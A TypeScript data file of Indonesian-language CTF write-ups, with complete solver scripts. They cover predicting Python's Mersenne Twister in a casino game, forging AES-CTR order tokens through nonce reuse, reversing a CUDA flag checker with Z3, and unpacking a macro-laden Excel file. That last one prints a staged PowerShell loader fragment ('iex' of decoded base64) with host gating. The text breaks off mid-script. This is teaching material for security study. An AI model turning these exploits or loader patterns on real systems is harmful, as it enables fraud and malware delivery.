import type { WriteUp } from '../types';

// Cyberbreaker Qual — 5 writeups
export const cyberbreakerQualWriteups: WriteUp[] = [
  {
    "id": "cyberbreaker-qual-crypto-casino",
    "title": "Challenge Crypto: casino",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Cyberbreaker Qual",
    "tags": [],
    "description": "Jadi di challenge ini, kita dikasih akses ke sebuah casino online lewat `nc`. Kita dikasih modal awal 1000 credits, tapi harga flag-nya mahal banget, yaitu 50.000 credits.",
    "problemDescription": "Jadi di challenge ini, kita dikasih akses ke sebuah casino online lewat `nc`. Kita dikasih modal awal 1000 credits, tapi harga flag-nya mahal banget, yaitu 50.000 credits.",
    "tools": [],
    "analysis": "Pas pertama kali baca source code `chall.py`, ada satu hal yang langsung bikin \"ngeh\":\n```python\nrng = random.Random(secrets.randbits(256))\n```\nChallenge ini pake library `random` bawaan Python. Masalahnya, library `random` di Python itu pake algoritma **Mersenne Twister**. Walaupun seed-nya pake `secrets.randbits(256)` (yang sebenernya aman), algoritma Mersenne Twister itu sendiri **bukan** *cryptographically secure PRNG*.\n\nArtinya apa? Kalau kita bisa ngumpulin cukup banyak output dari generatornya, kita bisa \"cloning\" atau nebak state internal-nya, terus kita bisa prediksi angka apa yang bakal keluar selanjutnya.",
    "solution": [
      {
        "title": "Strategi \"Nge-cheat\"",
        "content": "Mersenne Twister (MT19937) itu punya state berukuran 624 integer (masing-masing 32-bit). Di kodenya, setiap kali kita main roulette atau slots, sistem bakal manggil `rng.getrandbits(32)` buat bikin \"ticket id\".\n\nRencananya gini:\n1. Main roulette sebanyak 624 kali.\n2. Setiap ronde, kita pasang bet kecil aja (1 credit) biar modal nggak abis.\n3. Kita catat setiap `ticket id` yang keluar.\n4. Masukin 624 ticket id tadi ke library `randcrack`.\n5. Setelah dapet state-nya, kita prediksi `ticket id` ronde berikutnya.\n6. Hitung angka menangnya (`ticket % 37`).\n7. All-in modal kita ke angka itu.\n8. Profit! Terus beli flag-nya."
      },
      {
        "title": "Scripting",
        "content": "Daripada manual ngetik 624 kali (bisa gempor tangan), mending kita automasi pake `pwntools` dan `randcrack`.\n\nInti dari script solve-nya:",
        "code": "for i in range(624):\n    r.sendlineafter(b'> ', b'1') # Main roulette\n    r.sendlineafter(b'stake: ', b'1')\n    r.sendlineafter(b'number (0-36): ', b'0')\n    r.recvuntil(b'ticket id: ')\n    ticket = int(r.recvline().strip(), 16)\n    rc.submit(ticket) # Kasih datanya ke randcrack\n\npredicted_ticket = rc.predict_getrandbits(32)\nwinning_number = predicted_ticket % 37\nr.sendlineafter(b'> ', b'1')\nr.sendlineafter(b'stake: ', str(balance).encode()) # Pasang semua modal\nr.sendlineafter(b'number (0-36): ', str(winning_number).encode())"
      },
      {
        "title": "Eksekusi",
        "content": "Pas script-nya jalan, dia bakal grinding ngumpulin data dulu. Setelah dapet 624 ticket, boom! Tebakannya tepat sasaran. Modal yang tadinya cuma sisa dikit langsung naik drastis jadi 31.680 credits. Main sekali lagi biar dapet 1 juta lebih credits (biar sombong dikit), terus langsung ke menu nomor 3 buat beli flag.\n\n**Flag:**\n`CBC{st0p_gambling_st4rt_predicting!!_f8cad9}`\n\nPelajaran hari ini: Jangan pernah pake `random` buat urusan keamanan atau duit kalau nggak mau di-crack sama orang!"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from pwn import *\r\nfrom randcrack import RandCrack\r\nimport re\r\n\r\ndef solve():\r\n    # host = 'localhost' # for local testing if I had a server\r\n    # port = 1337\r\n    \r\n    host = 'crypto.cbd2026.cloud'\r\n    port = 1337\r\n\r\n    rc = RandCrack()\r\n    r = remote(host, port)\r\n\r\n    def get_balance():\r\n        r.recvuntil(b'Balance: ')\r\n        balance = int(r.recvuntil(b' credits').split()[0])\r\n        return balance\r\n\r\n    for i in range(624):\r\n        log.info(f\"Round {i+1}/624\")\r\n        r.sendlineafter(b'> ', b'1')\r\n        r.sendlineafter(b'stake: ', b'1')\r\n        r.sendlineafter(b'number (0-36): ', b'0')\r\n        \r\n        data = r.recvuntil(b'ticket id: ')\r\n        ticket_hex = r.recvline().strip().decode()\r\n        ticket = int(ticket_hex, 16)\r\n        rc.submit(ticket)\r\n        log.debug(f\"Ticket: {ticket:08x}\")\r\n\r\n    balance = get_balance()\r\n    log.info(f\"Current balance: {balance}\")\r\n\r\n    # Now predict\r\n    predicted_ticket = rc.predict_getrandbits(32)\r\n    winning_number = predicted_ticket % 37\r\n    log.info(f\"Predicted ticket: {predicted_ticket:08x}, Winning number: {winning_number}\")\r\n\r\n    # Bet all\r\n    r.sendlineafter(b'> ', b'1')\r\n    r.sendlineafter(b'stake: ', str(balance).encode())\r\n    r.sendlineafter(b'number (0-36): ', str(winning_number).encode())\r\n    \r\n    r.recvuntil(b'ticket id: ')\r\n    actual_ticket_hex = r.recvline().strip().decode()\r\n    log.info(f\"Actual ticket: {actual_ticket_hex}\")\r\n    \r\n    balance = get_balance()\r\n    log.info(f\"New balance: {balance}\")\r\n    \r\n    if balance < 50000:\r\n        log.info(\"Winning one more round to reach 50000...\")\r\n        predicted_ticket = rc.predict_getrandbits(32)\r\n        winning_number = predicted_ticket % 37\r\n        r.sendlineafter(b'> ', b'1')\r\n        r.sendlineafter(b'stake: ', str(balance).encode())\r\n        r.sendlineafter(b'number (0-36): ', str(winning_number).encode())\r\n        r.recvuntil(b'ticket id: ')\r\n        balance = get_balance()\r\n        log.info(f\"Final balance: {balance}\")\r\n\r\n    log.info(\"Buying flag...\")\r\n    r.sendlineafter(b'> ', b'3')\r\n    flag_line = r.recvall()\r\n    print(flag_line.decode())\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CBC{st0p_gambling_st4rt_predicting!!_f8cad9}",
    "lessonsLearned": ""
  },
  {
    "id": "cyberbreaker-qual-crypto-waifu-shop",
    "title": ": Waifu Shop (Crypto/Web)",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Cyberbreaker Qual",
    "tags": [],
    "description": "Writeup for challenge : Waifu Shop (Crypto/Web)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Cek `app.py`, bagian enkripsinya menarik:\n\n```python\nKEY = os.urandom(16)\nNONCE = os.urandom(8)\n\ndef crypt(data):\n    cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE)\n    return cipher.encrypt(data)\n```\n\n**Fatal Error:** Di sini `NONCE` didefinisikan sekali di level global. Setiap kali fungsi `crypt` dipanggil, dia pakai `NONCE` yang sama persis. \n\nDalam **AES-CTR**, kalau kita pakai Key dan Nonce yang sama untuk dua pesan yang berbeda, kita bakal dapet **Keystream Reuse**. \nRumusnya simpel:\n1. `Ciphertext = Plaintext ^ Keystream`\n2. `Keystream = Ciphertext ^ Plaintext`\n\nBerarti kalau kita tahu satu pasang Plaintext dan Ciphertext, kita bisa dapet Keystream-nya. Setelah dapet Keystream, kita bisa bikin Ciphertext palsu buat Plaintext apa pun yang kita mau.",
    "solution": [
      {
        "title": "1. Observasi Awal",
        "content": "Pas buka URL-nya, kita dikasih lihat toko waifu \"Celestial Waifu\". Ada beberapa item yang bisa kita beli, tapi item incaran kita, **Shinano (Celestial Waifu)**, statusnya *sold out* atau hanya untuk pemenang lottery.\n\nPas kita coba beli item lain (yang `available`), web ini bakal kasih kita semacam **Sealed Receipt** atau `order_token`. Token ini nantinya dikirim ke endpoint `/claim` untuk diverifikasi.\n\nTarget kita jelas: **Gimana cara dapet token buat Shinano dengan harga 0?** Karena di source code (`app.py`), syarat dapet flag adalah:",
        "code": "if order_data.get('item') == 'celestial_waifu' and order_data.get('price') == '000000':\n    return render_template('result.html', ok=True, title='Preorder secured', message=FLAG)"
      },
      {
        "title": "3. Strategi Serangan",
        "content": "1. **Dapatkan Token Valid:** Pesan item yang tersedia (contoh: `enterprise_gold`). Web bakal kasih `order_token`.\n2. **Decode Token:** Token itu di-encode pakai `urlsafe_b64`. Kita decode buat dapet `Ciphertext_A`.\n3. **Identifikasi Plaintext:** Dari code, kita tahu format order itu: \n   `item=enterprise_gold&price=004800&buyer=guest&ship=standard`\n   Ini adalah `Plaintext_A`.\n4. **Hitung Keystream:** `Keystream = Ciphertext_A ^ Plaintext_A`.\n5. **Forge Token:** \n   Plaintext target kita adalah: `item=celestial_waifu&price=000000&buyer=guest&ship=standard`.\n   `Ciphertext_Baru = Plaintext_Target ^ Keystream`.\n6. **Submit:** Encode `Ciphertext_Baru` ke Base64, terus kirim ke `/claim`."
      },
      {
        "title": "4. Scripting (solve.py)",
        "content": "Biar cepet, kita pakai Python buat hitung XOR-nya:",
        "code": "import requests\nimport base64\nimport re\nimport urllib3\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nBASE_URL = \"https://waifu-shop.cbd2026.cloud\"\n\ndef xor(a, b):\n    return bytes([x ^ y for x, y in zip(a, b)])\n\nprint(\"[*] Mengambil token Enterprise...\")\nresp = requests.post(f\"{BASE_URL}/order\", data={\"item\": \"enterprise_gold\"}, verify=False)\ntoken_legal = re.search(r'name=\"order_token\" value=\"([^\"]+)\"', resp.text).group(1)\n\nciphertext_a = base64.urlsafe_b64decode(token_legal + \"==\")\n\nplaintext_a = b\"item=enterprise_gold&price=004800&buyer=guest&ship=standard\"\n\nkeystream = xor(ciphertext_a, plaintext_a)\n\nplaintext_target = b\"item=celestial_waifu&price=000000&buyer=guest&ship=standard\"\nciphertext_target = xor(plaintext_target, keystream)\n\ntoken_palsu = base64.urlsafe_b64encode(ciphertext_target).decode().strip(\"=\")\n\nprint(f\"[*] Token palsu: {token_palsu}\")\nfinal_resp = requests.post(f\"{BASE_URL}/claim\", data={\"order_token\": token_palsu}, verify=False)\n\nif \"CBC{\" in final_resp.text:\n    flag = re.search(r'CBC\\{.*\\}', final_resp.text).group(0)\n    print(f\"[+] Flag ditemukan: {flag}\")"
      },
      {
        "title": "5. Hasil Akhir",
        "content": "Setelah script dijalankan, server menerima token palsu kita karena hasil dekripsinya menghasilkan plaintext yang valid (`celestial_waifu` dengan price `000000`). Server pun memberikan flag-nya:\n\n**Flag:**\n`CBC{enterprise_is_min333_4d0b8a}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import requests\r\nimport base64\r\nimport urllib3\r\n\r\n# Disable insecure request warnings\r\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\r\n\r\nBASE_URL = \"https://waifu-shop.cbd2026.cloud\"\r\n\r\ndef xor(a, b):\r\n    return bytes([x ^ y for x, y in zip(a, b)])\r\n\r\ndef solve():\r\n    # 1. Get a valid token for 'enterprise_gold'\r\n    print(\"[*] Getting token for 'enterprise_gold'...\")\r\n    resp = requests.post(f\"{BASE_URL}/order\", data={\"item\": \"enterprise_gold\"}, verify=False)\r\n    \r\n    # The token is in the HTML. I'll search for it.\r\n    # <input type=\"hidden\" name=\"order_token\" value=\"...\">\r\n    import re\r\n    match = re.search(r'name=\"order_token\" value=\"([^\"]+)\"', resp.text)\r\n    if not match:\r\n        print(\"[-] Could not find token in response\")\r\n        return\r\n    \r\n    token = match.group(1)\r\n    print(f\"[*] Got token: {token}\")\r\n    \r\n    # 2. Decode the token\r\n    # urlsafe_b64decode needs padding\r\n    ciphertext = base64.urlsafe_b64decode(token + '=' * (-len(token) % 4))\r\n    \r\n    # 3. Construct original plaintext\r\n    # item=enterprise_gold&price=004800&buyer=guest&ship=standard\r\n    original_plaintext = b\"item=enterprise_gold&price=004800&buyer=guest&ship=standard\"\r\n    \r\n    print(f\"[*] Ciphertext length: {len(ciphertext)}\")\r\n    print(f\"[*] Original plaintext length: {len(original_plaintext)}\")\r\n    \r\n    if len(ciphertext) != len(original_plaintext):\r\n        print(\"[-] Length mismatch!\")\r\n        return\r\n    \r\n    # 4. Derive keystream\r\n    keystream = xor(ciphertext, original_plaintext)\r\n    \r\n    # 5. Construct target plaintext\r\n    # item=celestial_waifu&price=000000&buyer=guest&ship=standard\r\n    target_plaintext = b\"item=celestial_waifu&price=000000&buyer=guest&ship=standard\"\r\n    \r\n    # 6. Create new ciphertext\r\n    new_ciphertext = xor(target_plaintext, keystream)\r\n    \r\n    # 7. Encode new token\r\n    new_token = base64.urlsafe_b64encode(new_ciphertext).decode().rstrip('=')\r\n    print(f\"[*] New token: {new_token}\")\r\n    \r\n    # 8. Claim the flag\r\n    print(\"[*] Claiming flag...\")\r\n    resp = requests.post(f\"{BASE_URL}/claim\", data={\"order_token\": new_token}, verify=False)\r\n    \r\n    if \"CBC{\" in resp.text:\r\n        flag = re.search(r'CBC\\{[^}]+\\}', resp.text).group(0)\r\n        print(f\"[+] Found flag: {flag}\")\r\n        print(f\"<FLAG>{flag}</FLAG>\")\r\n    else:\r\n        print(\"[-] Flag not found in response\")\r\n        print(resp.text)\r\n\r\nif __name__ == \"__main__\":\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CBC{enterprise_is_min333_4d0b8a}",
    "lessonsLearned": ""
  },
  {
    "id": "cyberbreaker-qual-rev-nvid",
    "title": "",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Cyberbreaker Qual",
    "tags": [],
    "description": "Awal lihat challenge ini kesannya cuma flag checker biasa. Tapi pas dicek, ternyata enggak sesimpel itu.",
    "problemDescription": "Awal lihat challenge ini kesannya cuma flag checker biasa. Tapi pas dicek, ternyata enggak sesimpel itu.\n\nBinary yang dikasih itu `checker.exe`, formatnya PE 64-bit buat Windows. Dari string-string yang kelihatan, langsung kebaca kalau format flag-nya `CBC{...}`. Terus dari pengecekan di fungsi `main`, ketahuan juga kalau total panjang flag harus 21 karakter. Artinya isi di dalam `{}` ada 16 karakter.\n\nJadi titik awalnya udah jelas:\n\n- prefix harus `CBC{`\n- suffix harus `}`\n- isi tengah 16 byte\n\nNah, habis itu saya kira tinggal bongkar beberapa operasi XOR atau compare biasa. Ternyata enggak. Binary ini bawa-bawa CUDA.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Langkah awal",
        "content": "Pertama saya cek isi folder sama tipe filenya:\n\n\n\nDari situ kelihatan ada section `.nv_fatb` dan seabrek import `cuda*`. Itu udah jadi red flag kalau validasi utamanya kemungkinan jalan di GPU, bukan di kode CPU biasa.\n\nDi `main`, alurnya kurang lebih begini:\n\n1. cek jumlah argumen\n2. cek panjang input\n3. cek `CBC{` di depan dan `}` di belakang\n4. ambil isi tengah 16 byte\n5. kirim ke fungsi yang pakai CUDA\n6. kalau hasil akhirnya cocok, print `:)`\n\nJadi bagian CPU cuma jadi satpam depan doang. Inti validasinya ada di kernel CUDA.",
        "code": "file checker.exe\nobjdump -h checker.exe\nstrings checker.exe"
      },
      {
        "title": "Kernel CUDA-nya di mana?",
        "content": "Section `.nv_fatb` ternyata nyimpen blob ELF buat device code NVIDIA. Saya scan magic `ELF` di binary dan ketemu dua blob. Yang pertama cuma metadata, yang kedua baru cubin yang beneran ada isi kernel-nya.\n\nSupaya enak dibaca, saya ekstrak tool CUDA lokal dari paket Debian, terus pakai:\n\n\n\nSetelah itu baru kelihatan nama kernel-nya:\n\n\n\nKalau didemangle itu kurang lebih `check_key`.",
        "code": "nvdisasm\ncuobjdump"
      },
      {
        "title": "Isi kernel",
        "content": "Pas kernel-nya dibedah, polanya lumayan jelas walau awalnya keliatan ribet banget.\n\nKernel ini:\n\n- baca 16 byte input\n- pecah jadi 4 blok, masing-masing 4 byte\n- rakit tiap blok jadi word 32-bit\n- proses word itu satu per satu\n\nSelain input, ada juga data penting di constant section:\n\n- `tr` = target akhir\n- `kbf` = deretan konstanta 32-bit\n- `rtbl` = deretan angka rotasi\n\nPola prosesnya kira-kira begini:\n\n1. blok pertama di-xor dulu dengan konstanta awal\n2. terus berkali-kali di-rotate kiri/kanan\n3. tiap ronde di-xor sama konstanta dari `kbf`\n4. lalu di-xor lagi sama konstanta tetap\n5. hasil blok sebelumnya dipakai buat ngacak blok berikutnya\n\nJadi ini modelnya chaining. Bukan 4 blok yang berdiri sendiri."
      },
      {
        "title": "Bagian yang paling ngeselin",
        "content": "Yang paling bikin waktu habis justru bukan ide besarnya, tapi detail kecilnya.\n\nAda dua hal yang sempat bikin model awal saya salah:\n\n1. semantik instruksi `SHF`\n2. ada dua konstanta yang mirip banget:\n\n\n\nAwalnya saya kira tinggal translate SASS ke rotate biasa dan langsung selesai. Ternyata kalau salah naruh operand `SHF`, hasil solver langsung `unsat`.\n\nBuat mastikan itu, saya bikin PTX mini sendiri yang isinya cuma instruksi `shf`, compile pakai `ptxas`, terus saya lihat SASS hasilnya. Dari situ baru kebaca operand mana yang jadi nilai, mana yang jadi shift amount, dan mana yang sebenernya cuma hasil lowering dari rotate.\n\nSetelah mapping ini bener, modelnya langsung masuk akal.",
        "code": "0xb00b800b\n0x8008b00b"
      },
      {
        "title": "Ngebalikinnya pakai Z3",
        "content": "Daripada brute force 16 karakter, jauh lebih waras modelkan transform-nya terus minta solver nyari input yang bikin hasil akhirnya sama dengan target.\n\nSaya tulis ulang logika kernel ke `solve.py`:\n\n- 16 byte jadi 4 word 32-bit\n- word pertama diolah beberapa ronde\n- hasilnya dipakai buat xor word kedua\n- terus lanjut chaining sampai word keempat\n- hasil akhir harus sama dengan nilai di `tr`\n\nBegitu constraint-nya pas, Z3 keluarin isi flag tengah:\n\n\n\nJadi flag lengkapnya:",
        "code": "Cc_uV_dAa___GPU!"
      },
      {
        "title": "Verifikasi",
        "content": "Solver final saya jalanin ulang dan hasilnya konsisten:\n\n\n\nOutput:",
        "code": "python solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "from z3 import And, BitVec, BitVecVal, Concat, RotateLeft, RotateRight, Solver\r\n\r\n\r\nTR = bytes.fromhex(\"b42e08332a0d22dccf6579a0a6f58e1c\")\r\nKBF = bytes.fromhex(\r\n    \"d267846906e3f29b323359e784a1d94c\"\r\n    \"69c2e329ed95175545e22618fe0ff7f5\"\r\n    \"d76f2a75080f338bf014af1e4ebcfc2c\"\r\n    \"b68887228bb978b24956f8c850687cd0\"\r\n    \"3f42541cadc6514a1d81bb0c7aff5825\"\r\n    \"ddf67e79feef40077aa01f66942ad5c1\"\r\n)\r\nRTBL = [\r\n    0x14, 0x1E, 0x12, 0x17, 0x0C, 0x13,\r\n    0x13, 0x18, 0x06, 0x19, 0x1B, 0x0B,\r\n    0x0D, 0x15, 0x1A, 0x0C, 0x1E, 0x0A,\r\n    0x0D, 0x17, 0x07, 0x19, 0x16, 0x1C,\r\n]\r\n\r\nPRE_XOR = BitVecVal(0xB00B800B, 32)\r\nROUND_XOR = BitVecVal(0x8008B00B, 32)\r\nMASK32 = BitVecVal(0xFFFFFFFF, 32)\r\nK = [BitVecVal(int.from_bytes(KBF[i:i + 4], \"little\"), 32) for i in range(0, len(KBF), 4)]\r\nT = [BitVecVal(int.from_bytes(TR[i:i + 4], \"little\"), 32) for i in range(0, len(TR), 4)]\r\n\r\n\r\ndef rr(state, rot, key):\r\n    return (RotateRight(state, rot) ^ key ^ ROUND_XOR) & MASK32\r\n\r\n\r\ndef rl(state, rot, key):\r\n    return (RotateLeft(state, rot) ^ key ^ ROUND_XOR) & MASK32\r\n\r\n\r\ndef pack32(chunk):\r\n    return Concat(chunk[3], chunk[2], chunk[1], chunk[0])\r\n\r\n\r\ndef main():\r\n    bs = [BitVec(f\"b{i}\", 8) for i in range(16)]\r\n    s = Solver()\r\n\r\n    for b in bs:\r\n        s.add(And(b >= 0x20, b <= 0x7E))\r\n\r\n    x0, x1, x2, x3 = [pack32(bs[i:i + 4]) for i in range(0, 16, 4)]\r\n\r\n    state = x0 ^ PRE_XOR\r\n    for idx, fn in zip(range(6), [rr, rl, rr, rl, rr, rl]):\r\n        state = fn(state, RTBL[idx], K[idx])\r\n    r8 = state\r\n\r\n    x1 ^= r8\r\n    state = x1\r\n    for idx, fn in zip(range(6, 12), [rr, rl, rr, rl, rr, rl]):\r\n        state = fn(state, RTBL[idx], K[idx])\r\n    r4 = state\r\n\r\n    x2 ^= r4\r\n    state = x2\r\n    for idx, fn in zip(range(12, 18), [rr, rl, rr, rl, rr, rl]):\r\n        state = fn(state, RTBL[idx], K[idx])\r\n    r5 = state\r\n\r\n    x3 ^= r5\r\n    state = x3\r\n    for idx, fn in zip(range(18, 24), [rr, rl, rr, rl, rr, rl]):\r\n        state = fn(state, RTBL[idx], K[idx])\r\n    r0 = state\r\n\r\n    s.add(r8 == T[0], r4 == T[1], r5 == T[2], r0 == T[3])\r\n\r\n    if s.check().r != 1:\r\n        raise SystemExit(\"no solution\")\r\n\r\n    m = s.model()\r\n    inner = bytes(m[b].as_long() for b in bs).decode()\r\n    print(f\"CBC{{{inner}}}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CBC{Cc_uV_dAa___GPU!}",
    "lessonsLearned": ""
  },
  {
    "id": "cyberbreaker-qual-rev-office",
    "title": "Office",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "Cyberbreaker Qual",
    "tags": [],
    "description": "Kategori: Reverse Engineering",
    "problemDescription": "Kategori: Reverse Engineering\n\nFlag:\n\n```text\nCBC{b3w4r3_h1dd3n_m4cr0s}\n```",
    "tools": [],
    "analysis": "Pertama cek tipe file:\n\n```bash\nfile Game.xlsm Game.7z\n```\n\nHasilnya:\n\n```text\nGame.xlsm: Microsoft Excel 2007+\nGame.7z:   7-zip archive data\n```\n\nKarena `xlsm` sebenarnya adalah ZIP berisi XML dan macro, isi filenya bisa dilihat dengan:\n\n```bash\nunzip -l Game.xlsm\n```\n\nBeberapa file yang penting:\n\n```text\nxl/workbook.xml\nxl/worksheets/sheet1.xml\nxl/worksheets/sheet2.xml\nxl/sharedStrings.xml\nxl/vbaProject.bin\n```\n\nDi `xl/workbook.xml` ada petunjuk menarik:\n\n```xml\n<sheet name=\"Data\" sheetId=\"2\" state=\"veryHidden\" r:id=\"rId2\"/>\n```\n\nArtinya workbook punya sheet bernama `Data` yang sengaja disembunyikan dengan mode `veryHidden`. Sheet ini akhirnya memang jadi tempat penyimpanan payload.",
    "solution": [
      {
        "title": "TL;DR",
        "content": "File challenge berupa `Game.xlsm`, jadi ini bukan sekadar spreadsheet biasa. Di dalamnya ada macro VBA yang menjalankan PowerShell. PowerShell tersebut bertahap mendecode payload lain dari sheet Excel yang disembunyikan.\n\nAlur besarnya:",
        "code": "Game.xlsm\n-> VBA Workbook_Open\n-> PowerShell EncodedCommand\n-> C# helper untuk hash + AES\n-> gate hostname WORK-PC\n-> gate username Fischer\n-> decrypt .NET assembly\n-> ambil prefix flag dari logic registry\n-> decrypt PNG berisi suffix flag"
      },
      {
        "title": "2. Macro VBA",
        "content": "Macro bisa diekstrak memakai `olevba`:\n\n\n\nBagian pentingnya ada di `Workbook_Open()`. Macro melakukan XOR kecil untuk membentuk beberapa string. Setelah dideobfuscate, string tersebut adalah:\n\n\n\nMacro mengambil tiga cell dari sheet `Data`:\n\n\n\nKetiga cell itu digabung, lalu dijalankan sebagai PowerShell `EncodedCommand`.\n\nJadi dari sini jelas bahwa challenge tidak selesai di Excel formula. Macro hanya loader untuk payload PowerShell berikutnya.",
        "code": "olevba Game.xlsm"
      },
      {
        "title": "3. Decode PowerShell Stage Pertama",
        "content": "Payload di cell tersebut adalah base64 UTF-16LE, format standar untuk PowerShell `-EncodedCommand`.\n\nSetelah didecode, stage pertama isinya membuat array string `$Sd886`, menggabungkannya, decode base64 lagi, lalu mengeksekusi hasilnya:\n\n\n\nPayload berikutnya berisi C# helper class bernama:\n\n\n\nClass ini punya tiga fungsi penting:",
        "code": "$IVVvPHr = [System.Text.Encoding]::Unicode.GetString(\n    [Convert]::FromBase64String([string]::Join(\"\", $Sd886))\n)\niex $IVVvPHr"
      },
      {
        "title": "4. Gate Hostname",
        "content": "Stage ini mengecek hostname komputer:\n\n\n\nAngka `3735928559` adalah `0xDEADBEEF`.\n\nFungsi `LsXxaQ` hanya operasi byte sederhana: rotate, XOR dengan seed, lalu update seed. Karena tidak ada hashing kriptografis sungguhan, hasilnya bisa dibalik byte per byte.\n\nMembalik:\n\n\n\nmenghasilkan hostname:\n\n\n\nSetelah hostname valid, fungsi berikutnya dipanggil:\n\n\n\n`3405691582` adalah `0xCAFEBABE`. Dengan state internal yang masih berlanjut, hasilnya:\n\n\n\nNilai ini cocok dengan cell:\n\n\n\nLalu dipakai sebagai password AES untuk decrypt blob di:",
        "code": "$expectedHash = \"A045A54E5737EF\"\n$hostname = $env:COMPUTERNAME\n\nif (([XJJfQh0HMY]::LsXxaQ($hostname, 3735928559) -ne $expectedHash) -and\n    ($hostname.Length -ne 7)) {\n    exit\n}"
      },
      {
        "title": "5. Gate Username",
        "content": "Payload hasil decrypt tadi melakukan hal yang sama, tapi kali ini terhadap username:\n\n\n\nYang perlu diperhatikan: class C# memakai static seed. Jadi state dari pengecekan hostname masih mempengaruhi hasil pengecekan username.\n\nDengan state yang benar, hash ini bisa dibalik menjadi:\n\n\n\nUsername `Fischer` lalu dipakai sebagai password AES untuk decrypt blob di:",
        "code": "$JjQnfD = $env:USERNAME\n$QVudi = \"FDDE36E35BFC28\"\n\nif (([XJJfQh0HMY]::Pia2wRPUo4iX($JjQnfD, 3405691582) -ne $QVudi) -and\n    ($JjQnfD.Length -ne 7)) {\n    exit\n}"
      },
      {
        "title": "6. Decrypt Assembly .NET",
        "content": "Payload berikutnya kembali memakai hostname `WORK-PC`. Ia mengambil empat cell besar:\n\n\n\nKeempatnya digabung dan didecrypt dengan AES, password:\n\n\n\nHasil decrypt adalah file PE/.NET assembly:\n\n\n\nKalau disimpan sementara dan dicek:\n\n\n\nhasilnya:\n\n\n\nMethod yang dipanggil oleh PowerShell:",
        "code": "Data!XFD1048560\nData!XFD1048561\nData!XFD1048562\nData!XFD1048563"
      },
      {
        "title": "7. Logic di Assembly",
        "content": "Disassembly dengan `monodis` memperlihatkan assembly ini membaca registry:\n\n\n\nNama registry key dan value tidak terlihat langsung di source karena disimpan sebagai byte XOR `0x42`. Setelah didecode:\n\n\n\nAssembly lalu membangun string:\n\n\n\nKarena hostname dan username sudah diketahui, formatnya menjadi:\n\n\n\nString tersebut diproses oleh fungsi `REcPQ3X`, lalu dibandingkan dengan 36 byte static di assembly.\n\nFungsi `REcPQ3X` reversible. Ia bekerja per 4 byte:\n\n\n\nDengan membalik operasi itu terhadap target static, plaintext yang didapat:\n\n\n\nJadi isi registry `FlagPart1` yang diharapkan adalah prefix flag:\n\n\n\nTidak perlu benar-benar membuat registry Windows. Cukup balik transformnya secara offline.",
        "code": "HKCU\\SOFTWARE\\CTFChallenge\nValue: FlagPart1"
      },
      {
        "title": "8. Decode PNG Final",
        "content": "Setelah registry value dianggap valid, assembly menghitung seed dari:\n\n\n\nSeed ini dipakai untuk XOR PRNG terhadap blob besar di section `.sdata`. Hasilnya adalah PNG valid:\n\n\n\nPNG tersebut berisi teks:\n\n\n\nGabungan prefix dari assembly dan suffix dari PNG:\n\n\n\nFlag final:",
        "code": "CBC{b3w4r3"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport base64\r\nimport hashlib\r\nimport io\r\nimport re\r\nimport struct\r\nimport sys\r\nimport zipfile\r\nimport xml.etree.ElementTree as ET\r\n\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import unpad\r\n\r\n\r\nNS = {\"m\": \"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"}\r\n\r\n\r\ndef rol8(x, n):\r\n    return ((x << n) | (x >> (8 - n))) & 0xFF\r\n\r\n\r\ndef ror8(x, n):\r\n    return ((x >> n) | (x << (8 - n))) & 0xFF\r\n\r\n\r\ndef rol32(x, n):\r\n    return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF\r\n\r\n\r\ndef ror32(x, n):\r\n    return ((x >> n) | (x << (32 - n))) & 0xFFFFFFFF\r\n\r\n\r\ndef read_shared_strings(zf):\r\n    root = ET.fromstring(zf.read(\"xl/sharedStrings.xml\"))\r\n    out = []\r\n    for si in root.findall(\"m:si\", NS):\r\n        out.append(\"\".join(t.text or \"\" for t in si.iter(f\"{{{NS['m']}}}t\")))\r\n    return out\r\n\r\n\r\ndef read_sheet_cells(zf, sheet_path, shared_strings):\r\n    root = ET.fromstring(zf.read(sheet_path))\r\n    cells = {}\r\n    for cell in root.findall(\".//m:c\", NS):\r\n        ref = cell.attrib[\"r\"]\r\n        value = cell.find(\"m:v\", NS)\r\n        if value is None:\r\n            continue\r\n        data = value.text or \"\"\r\n        if cell.attrib.get(\"t\") == \"s\":\r\n            data = shared_strings[int(data)]\r\n        cells[ref] = data\r\n    return cells\r\n\r\n\r\ndef ps_array_payload(script, var_name):\r\n    m = re.search(rf\"\\${var_name}\\s*=\\s*@\\((.*?)\\)\\s*\\n\", script, re.S)\r\n    if not m:\r\n        raise ValueError(f\"PowerShell array ${var_name} not found\")\r\n    return \"\".join(re.findall(r'\"([A-Za-z0-9+/=]+)\"', m.group(1)))\r\n\r\n\r\ndef aes_decrypt_b64(ciphertext_b64, password):\r\n    key = hashlib.sha256(password.encode()).digest()\r\n    cipher = AES.new(key, AES.MODE_CBC, b\"\\x00\" * 16)\r\n    return unpad(cipher.decrypt(base64.b64decode(ciphertext_b64)), 